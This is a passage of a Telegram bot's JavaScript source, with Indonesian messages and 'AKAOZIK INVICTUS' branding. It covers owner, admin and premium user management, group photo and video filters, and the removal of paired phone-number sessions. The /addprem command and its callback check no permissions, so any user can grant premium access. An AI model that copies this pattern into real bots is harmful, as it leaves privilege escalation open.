⸙ 𝚄𝚜𝚎𝚛 𝚋𝚞𝚔𝚊𝚗 𝙾𝚠𝚗𝚎𝚛 🅇
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // KONFIRMASI
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸙
━━━━━━━━━━━━━━━━━━
⸙ 𝙲𝚕𝚒𝚌𝚔 𝚝𝚘𝚖𝚋𝚘𝚕 𝚈𝚎𝚜 𝚘𝚛 𝙽𝚘... 
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_delowner_${targetUserId}` },
            { text: "❌ NO", callback_data: `cancel_delowner` }
          ]
        ]
      }
    }
  );
});


// ========== YES ==========
bot.action(/confirm_delowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Bukan owner ❗");
  }

  ownerUsers = ownerUsers.filter(id => id !== targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎 
━━━━━━━━━━━━━━━━━━━━
⸙ 𝙾𝚠𝚗𝚎𝚛 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒 𝚍𝚎𝚕𝚎𝚝𝚎𝚍 √
⸙ 👤 𝙸𝚍 𝚄𝚜𝚎𝚛: \`${targetUserId}\`
⸙ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚕𝚎𝚝𝚎𝚍 ⎋
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("ᴀᴋsᴇs ᴏᴡɴᴇʀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴄᴀʙᴜᴛ ⎙");
});


// ========== NO ==========
bot.action("cancel_delowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝘾𝘼𝙉𝘾𝙀𝙇 ⎋
━━━━━━━━━━━━━━━
⸙ 𝙿𝚛𝚘𝚜𝚎𝚜 𝚍𝚒𝚋𝚊𝚝𝚊𝚕𝚔𝚊𝚗 🅇
⸙ 𝙾𝚠𝚗𝚎𝚛 𝚗𝚘 𝚍𝚎𝚕𝚎𝚝𝚎𝚍 🅇
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("ᴄᴀɴᴄᴄᴇʟᴇᴅ ❌");
});
// ========== COMMAND /addadmin ==========
bot.command("addadmin", checkOwner, async (ctx) => {

  let targetUserId;

  // ================= REPLY CHECK =================
  if (ctx.message.reply_to_message) {

    targetUserId =
      ctx.message.reply_to_message.from.id.toString();

  } else {

    const args = ctx.message.text.split(" ");

    targetUserId = args[1];

  }

  // ================= FORMAT ERROR =================
  if (!targetUserId) {

    return ctx.reply(

`<blockquote><b>🚨 ÄÐÐÈÐ ÄÐMÌñ ACCESS 🚨</b></blockquote>
<b>Format Penggunaan :</b>
<code>/addadmin 8657792129</code>
<blockquote><b>Atau :</b></blockquote>
Reply pesan target lalu ketik
<code>/addadmin</code>

<blockquote>Pastikan ID target valid sebelum menambahkan admin.</blockquote>`,

      {
        parse_mode: "HTML"
      }

    );

  }

  // ================= ALREADY ADMIN =================
  if (adminList.includes(targetUserId)) {

    return ctx.reply(

`<blockquote><b>⚠️ USER SUDAH MENJADI ADMIN</b></blockquote>
<b>Target User :</b>
<code>${targetUserId}</code>
<b>Status :</b>
Already Admin Access √`,

      {
        parse_mode: "HTML"
      }

    );

  }

  // ================= ADD ADMIN =================
  addAdmin(targetUserId);

  // ================= SUCCESS =================
  await ctx.reply(

`<blockquote><b>ADMIN ACCESS ACTIVATED</b></blockquote>
<b>Target User :</b>
<code>${targetUserId}</code>
<b>Status :</b>
Admin Access Successfully Added √

<blockquote>User sekarang memiliki akses Admin
</blockquote>`,

    {
      parse_mode: "HTML"
    }

  );

});

// ========== COMMAND /addprem (DENGAN TAMPILAN MENARIK) ==========
bot.command("addprem", async (ctx) => {

  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId =
      ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {

    return ctx.reply(
      "<blockquote><b>❌ FORMAT SALAH</b></blockquote>\n\n" +
      "Gunakan:\n" +
      "<code>/addprem id_user</code>\n" +
      "atau reply pesan target",
      {
        parse_mode: "HTML"
      }
    );

  }

  if (premiumUsers.includes(targetUserId)) {

    return ctx.reply(
      `<blockquote><b>⚠️ USER SUDAH PREMIUM</b></blockquote>\n\n` +
      `ID Target : <code>${targetUserId}</code>\n` +
      `Status : Premium Active`,
      {
        parse_mode: "HTML"
      }
    );

  }

  // ================= SEND PANEL =================
  await ctx.reply(

`<blockquote><b>🚨 PREMIUM ACCESS 🚨</b>
<b>Target User :</b> <code>${targetUserId}</code></blockquote>
<b>Pilih durasi premium untuk target user.
Pastikan ID sudah benar sebelum melanjutkan.</b>`,

    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "30 ᴅᴀʏ",
              callback_data: `prem_30_${targetUserId}`,
              style: "danger"
            },
            {
              text: "90 ᴅᴀʏ",
              callback_data: `prem_90_${targetUserId}`,
              style: "success"
            },
            {
              text: "120 ᴅᴀʏ",
              callback_data: `prem_120_${targetUserId}`,
              style: "primary"
            }
          ],
          [
            {
              text: "❌ ᴄᴀɴᴄᴇʟ ᴄᴏɴғɪʀᴍᴀᴛɪᴏɴ",
              callback_data: "prem_cancel",
              style: "danger"
            }
          ]
        ]
      }
    }

  );

});

// ================= ACTION =================
bot.action(/prem_.+/, async (ctx) => {

  const data = ctx.match[0];

  // ================= CANCEL =================
  if (data === "prem_cancel") {

    await ctx.editMessageText(

`<blockquote><b>❌ ACTION CANCELED</b></blockquote>
Akses penambahan premium telah dibatalkan.`,

      {
        parse_mode: "HTML"
      }

    ).catch(() => {});

    return;

  }

  // ================= GET DATA =================
  const [_, duration, userId] = data.split("_");

  // ================= SAVE PREMIUM =================
  if (!premiumUsers.includes(userId)) {

    premiumUsers.push(userId);

    saveJSON(premiumFile, premiumUsers);

  }

  // ================= SUCCESS =================
  await ctx.editMessageText(

`<blockquote><b>✅ PREMIUM BERHASIL DIAKTIFKAN</b></blockquote>
<blockquote><b>ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ :</b> <code>${userId}</code>
<b>ᴅᴜʀᴀsɪ ᴀᴄᴄᴇss ᴘʀᴇᴍɪᴜᴍ :</b> ${duration} ᴅᴀʏ
<b>sᴛᴀᴛᴜs ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ :</b> Premium Access Active √</blockquote>`,

    {
      parse_mode: "HTML"
    }

  ).catch(() => {});

});
// ========== DISABLE / ENABLE COMMAND (NO OWNER ID, NO FS) ==========
let disabled = [];

// ================= OFF CMD =================
bot.command("block", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /block nama_command");

  const cmd = args[1].toLowerCase();

  if (disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} sudah nonaktif.`);

  disabled.push(cmd);

  return ctx.reply(`🚫 /${cmd} berhasil dinonaktifkan.`);
});

// ================= ON CMD =================
bot.command("unblock", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /unblock nama_command");

  const cmd = args[1].toLowerCase();

  if (!disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} tidak dalam daftar nonaktif.`);

  disabled = disabled.filter(c => c !== cmd);

  return ctx.reply(`✅ /${cmd} berhasil diaktifkan.`);
});

// ================= DISABLE LIST =================
bot.command("listblock", checkOwner, (ctx) => {

  if (disabled.length === 0) {
    return ctx.reply(
`📋 BLOCK CMD LIST
✅ Tidak ada command yang dinonaktifkan`
    );
  }

  const list = disabled
    .map((c, i) => `• ${i + 1}. /${c}`)
    .join("\n");

  return ctx.reply(
`📋 BLOCK CMD LIST
🚫 Command nonaktif:
${list}

📊 Total: ${disabled.length}`
  );

});
// ========== COMMAND /deladmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("deladmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/deladmin 8657792129 / Id User`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/deladmin` sambil reply\n" +
      "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user ada di daftar admin
  if (!adminList.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN ADMIN* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus admin
  removeAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses admin lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses admin telah dicabut.\n` +
    `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /delprem (FIX NO ERROR & CLEAN) ==========
bot.command("delprem", checkAdmin, async (ctx) => {
  let targetUserId;

  // Ambil target dari reply atau args
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  // Jika tidak ada target
  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
🧩 ┏━━━━━━━━━━━━━━━━━━━━━━┓
✨ CARA PAKAI COMMAND DELPREMIUM
 ━━━━━━━━━━━━━━━━━━━━━━━
📌 Contoh:
> /delprem 8657792129 / Id User
📌 Atau reply user:
> /delprem (reply pesan)
🧩 ┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Jika bukan premium
  if (!premiumUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
⚠️ ┏━━━━━━━━━━━━━━━━━━┓
❌ USER BUKAN PREMIUM
━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`
> User ini tidak terdaftar premium sebagai
akses premium !
⚠️ ┗━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus dari premium
  premiumUsers = premiumUsers.filter(id => id !== targetUserId);
  saveJSON(premiumFile, premiumUsers);

  // Sukses hapus
  await ctx.reply(
`
\`\`\`js
🧩 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
✨  PREMIUM BERHASIL DIHAPUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`
> 🚫 Akses premium dicabut
> 📌 Sekarang user tidak memiliki akses
🧩 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /list (ULTRA KECE) ==========
bot.command("listakses", checkAdmin, async (ctx) => {
  await ctx.reply(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙿𝚒𝚕𝚒𝚑 𝚍𝚊𝚝𝚊 𝚢𝚊𝚗𝚐 𝚒𝚗𝚐𝚒𝚗 𝚍𝚒 𝚕𝚒𝚑𝚊𝚝.. 
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 þRÈMÌÚM ☇ ÄÇÇÈ§", callback_data: "show_premium", style: "primary" },
            { text: "👑 ÄÐMÌñ ☇ ÄÇÇÈ§", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 ÖWñÈR ☇ ÄÇÇÈ§", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== PREMIUM ==========
bot.action("show_premium", async (ctx) => {
  if (premiumUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙱𝚎𝚕𝚞𝚖 𝚊𝚍𝚊 𝚞𝚜𝚎𝚛 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 ❌
\`\`\`
`,
      backBtn()
    );
  }

  let text = premiumUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝗧𝗼𝘁𝗮𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺: ${premiumUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== ADMIN ==========
bot.action("show_admin", async (ctx) => {
  if (adminList.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙱𝚎𝚕𝚞𝚖 𝚊𝚍𝚊 𝙰𝚍𝚖𝚒𝚗 ❌
\`\`\`
`,
      backBtn()
    );
  }

  let text = adminList
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝗧𝗼𝘁𝗮𝗹 𝗔𝗱𝗺𝗶𝗻: ${adminList.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== OWNER ==========
bot.action("show_owner", async (ctx) => {
  if (ownerUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙊𝙒𝙉𝙀𝙍 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙱𝚎𝚕𝚞𝚖 𝚊𝚍𝚊 𝙾𝚠𝚗𝚎𝚛 ❌
\`\`\`
`,
      backBtn()
    );
  }

  let text = ownerUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝗢𝘄𝗻𝗲𝗿: ${ownerUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== BACK ==========
bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙿𝚒𝚕𝚒𝚑 𝚍𝚊𝚝𝚊 𝚢𝚊𝚗𝚐 𝚒𝚗𝚐𝚒𝚗 𝚍𝚒 𝚕𝚒𝚑𝚊𝚝.. 
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 þRÈMÌÚM ☇ ÄÇÇÈ§", callback_data: "show_premium", style: "primary" },
            { text: "👑 ÄÐMÌñ ☇ ÄÇÇÈ§", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 ÖWñÈR ☇ ÄÇÇÈ§", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON TEMPLATE ==========
function backBtn() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "☇ ßå¢k", callback_data: "list_back", style: "danger" }]
      ]
    }
  };
}

const startTime = Date.now();

bot.command("cekbot", async (ctx) => {
  try {
    const msg = await ctx.reply("🔄 initializing...");

    const steps = [
      "10% ⟩ checking panel...",
      "20% ⟩ loading cpu...",
      "30% ⟩ validating system...",
      "40% ⟩ checking connection...",
      "50% ⟩ syncing data...",
      "60% ⟩ scanning modules...",
      "70% ⟩ verifying security...",
      "80% ⟩ optimizing response...",
      "90% ⟩ finalizing...",
      "100% ⟩ completed ✔"
    ];

    for (let step of steps) {
      await new Promise(r => setTimeout(r, 350));

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        `🤖 <b>AKAOZIK SYSTEM CHECK</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    // uptime
    const uptime = Date.now() - startTime;

    const d = Math.floor(uptime / (1000 * 60 * 60 * 24));
    const h = Math.floor((uptime / (1000 * 60 * 60)) % 24);
    const m = Math.floor((uptime / (1000 * 60)) % 60);
    const s = Math.floor((uptime / 1000) % 60);

    const uptimeFormat = `${d}d ${h}h ${m}m ${s}s`;

    // ping
    const ping = Date.now() - (ctx.message.date * 1000);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🤖 <b>INFORMATION RUNNING</b>
 ━━━━━━━━━━━━━━━
┃ ⚡ Status : <b>ONLINE</b>
┃ ⏱️ Uptime : <code>${uptimeFormat}</code>
┃ 📡 Ping   : <code>${ping} ms</code>
┗━━━━━━━━━━━━━━━</blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("TERJADI ERROR PADA COMMAND /cekbot:", err);
  }
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", checkOwner, async (ctx) => {
  try {

    // ================= PRIVATE CHECK =================
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    // ================= GET GROUP DATA =================
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Unknown";

    // ================= SET MODE =================
    setGroupMode("on");

    // ================= SUCCESS RESPONSE =================
    return ctx.reply(
`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>GROUP ONLY ENABLED ✅</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>
<b>Id Group :</b> ${groupId}
<b>Name Group :</b> ${groupName}
<b>Status :</b> Activated`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("groupoff", checkOwner, async (ctx) => {
  try {

    // ================= PRIVATE CHECK =================
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    // ================= GET GROUP DATA =================
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Unknown";

    // ================= SET MODE =================
    setGroupMode("off");

    // ================= SUCCESS RESPONSE =================
    return ctx.reply(
`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>GROUP ONLY DISABLED ❌</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>
<b>Id Group :</b> ${groupId}
<b>Name Group :</b> ${groupName}
<b>Status :</b> Deactivated`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("delpair", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply(
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /delpair 628xxxx");
  }

  const botNumber = args[1].replace(/[^0-9]/g, "");

  let statusMessage = await ctx.reply(
`\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ — 𝙇𝙊𝘼𝘿𝙄𝙉𝙂
ID: ${botNumber}
Status: Executing...\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);

    // 🔥 FIX UTAMA (ANTI BOT ZOMBIE)
    if (sock) {
      try {
        await sock.logout();
      } catch (e) {}

      try {
        sock.end?.();         // matiin koneksi
        sock.ws?.close?.();   // force close websocket
      } catch (e) {}

      sessions.delete(botNumber);
    }

    // 🔥 HAPUS FOLDER SESSION
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // 🔥 UPDATE FILE SESSION
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updatedNumbers = activeNumbers.filter(
        (num) => num !== botNumber
      );
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ — 𝙎𝙐𝘾𝘾𝙀𝙎𝙎
ID: ${botNumber}
Status: Berhasil di hapus!\`\`\`
`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ — 𝙀𝙍𝙍𝙊𝙍
ID: ${botNumber}
Status: ${error.message}\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("restart", async (ctx) => {
  try {
    const teks = `
\`\`\`js
ÄKÄÖZÌK ÌñVÌÇ₮Ú§ - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙇𝙔
━━━━━━━━━━━━━━━━━━━
⎌ 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝙊𝙩𝙤𝙢𝙖𝙩𝙞𝙨 𝙋𝙖𝙙𝙖 𝙋𝙖𝙣𝙚𝙡 𝘽𝙖𝙣𝙜... 𝙈𝙤𝙝𝙤𝙣 𝙏𝙪𝙣𝙜𝙜𝙪 𝙎𝙚𝙟𝙚𝙣𝙖𝙠.....
\`\`\`
    `;

    await ctx.reply(teks, { parse_mode: "Markdown" });

    setTimeout(() => {
      process.exit(0);
    }, 2500);

  } catch (err) {
    console.log(err);
    ctx.reply("Gagal restart. Masalah pada Internal Server.");
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1m / 1h / 1d / 0\nm = menit\nh = jam\nd = detik");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});

bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

